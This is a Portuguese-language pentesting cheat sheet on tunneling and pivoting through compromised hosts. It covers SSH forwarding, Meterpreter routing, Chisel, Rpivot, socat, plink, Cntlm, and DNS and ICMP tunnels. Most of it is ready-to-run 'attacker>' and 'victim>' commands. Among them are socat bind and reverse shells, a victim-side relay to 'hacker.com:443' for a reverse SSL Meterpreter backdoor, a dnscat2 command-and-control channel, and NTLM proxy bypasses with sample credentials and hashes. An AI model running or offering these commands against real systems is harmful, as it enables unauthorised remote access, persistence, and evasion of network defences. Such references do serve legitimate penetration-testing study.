# Tunneling e Port Forwarding

## **SSH**

Conexão gráfica com SSH \(X\)

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Local Port2Port

Abra uma nova porta no servidor SSH -&gt; Outra porta

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Porta local -&gt; Host comprometido \(SSH\) -&gt; Third\_box: Port

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet \(proxychains\)

Porta local -&gt; Host comprometido \(SSH\) -&gt; Local

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### VPN-Tunnel

Você precisa de root em ambos os dispositivos \(já que vai criar novas interfaces\) e a configuração do sshd deve permitir login de root:  
`PermitRootLogin yes`  
`PermitTunnel yes`

```bash
ssh username@server -w any:any #This wil create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
```

Ativar encaminhamento no lado do servidor

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Defina uma nova rota no lado do cliente

```text
route add -net 10.0.0.0/16 gw 1.1.1.1
```

## SSHUTTLE

Você pode encapsular via ssh todo o tráfego para uma sub-rede por meio de um host. Exemplo, encaminhando todo o tráfego que vai para 10.10.10.0/24

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

## Meterpreter

### Port2Port

Porta local -&gt; Host comprometido \(sessão ativa\) -&gt; Third\_box: Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### Port2hostnet \(proxychains\)

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Outra maneira:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## reGeorg

Link: [**reGeorg**](https://github.com/sensepost/reGeorg)\*\*\*\*

Você precisa fazer upload de um túnel de arquivo da web: px\|js\|jsp\|php\|php\|jsp

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

**Link:** [**Chisel**](%20https://github.com/jpillora/chisel)\*\*\*\*

Você precisa usar a mesma versão para cliente e servidor

### socks

```bash
./chisel server -p 8080 --reverse #Server
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
#And now you can use proxychains with port 1080 (default)
```

## Rpivot

link: ****[**Rpivot**](https://github.com/klsecservices/rpivot)\*\*\*\*

Túnel reverso. O túnel é iniciado a partir da vítima.   
Um proxy socks4 é criado em 127.0.0.1:1080

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Através do **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

Link: [**Socat**](https://github.com/andrew-d/static-binaries)\*\*\*\*

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
```

### Port2Port through socks

```bash
socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter through SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Você pode ignorar um proxy não autenticado executando esta linha em vez da última no console da vítima:

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Crie certificados em ambos os lados: Cliente e Servidor

```bash
# Execute this commands in both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Conecte a porta SSH local \(22\) à porta 443 do host invasor

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

É como uma versão do console PuTTY \(as opções são muito semelhantes às de um cliente ssh\).  
Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço e porta ssh para que possamos ter uma conexão reversa. Então, para encaminhar apenas uma porta acessível localmente para uma porta em nossa máquina:

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## NTLM proxy bypass

A ferramenta mencionada anteriormente: **Rpivot**  
**OpenVPN** também pode ignorá-lo, definindo essas opções no arquivo de configuração:

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

### Cntlm

Link: [**Cntlm** ](http://cntlm.sourcefor)\*\*\*\*

Ele é autenticado em um proxy e vincula uma porta localmente, que é encaminhada ao serviço externo que você especificar. Então, você pode usar a ferramenta de sua escolha por meio desta porta.   
Exemplo de porta de encaminhamento 443

```text
Username Alice 
Password P@ssw0rd 
Domain CONTOSO.COM 
Proxy 10.0.0.10:8080 
Tunnel 2222:<attackers_machine>:443
```

Agora, se você definir, por exemplo, na vítima, o serviço SSH para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do invasor. 

Você também pode usar um meterpreter que se conecta a localhost: 443 e o invasor está escutando na porta 2222.

## YARP

 [**YARP**](https://github.com/microsoft/reverse-proxy) **-** É um proxy reverso criado pela Microsoft.

## DNS Tunneling

### Iodine

Link: [**Iodine**](https://code.kryo.se/iodine/)\*\*\*\*

Root é necessário em ambos os sistemas para criar adaptadores de túnel e dados de túneis entre eles usando consultas DNS.

```text
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

O túnel será muito lento. Você pode criar uma conexão SSH compactada por meio deste túnel usando:

```text
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

Estabelece um canal C&C por meio do DNS. Não precisa de privilégios de root.

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com
```

**Port forwarding com dnscat**

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Change proxychains DNS

Proxychains interceptando `gethostbyname` chamada de libc e túneis de solicitação de DNS tcp por meio do proxy socks. Por padrão, o servidor DNS que o proxychains usa é 4.2.2.2 \(codificado\). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um ambiente Windows, poderá definir o IP do controlador de domínio.

## Tunnels in Go

Link: [**GTunnel**](https://github.com/hotnops/gtunnel)\*\*\*\*

## ICMP Tunneling

### Hans

* [**Hans**](https://github.com/friedrich/hans)
* [**Hanstunnel**](https://github.com/albertzak/hanstunnel)\*\*\*\*

Root é necessário em ambos os sistemas para criar adaptadores de túnel e dados de túneis entre eles usando solicitações de echo ICMP.

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

## Outras Ferramentas:

* \*\*\*\*[**SSF**](https://github.com/securesocketfunneling/ssf)\*\*\*\*
* \*\*\*\*[**3proxy**](https://github.com/z3APA3A/3proxy)\*\*\*\*
* \*\*\*\*[**Chisel**](https://github.com/jpillora/chisel)\*\*\*\*

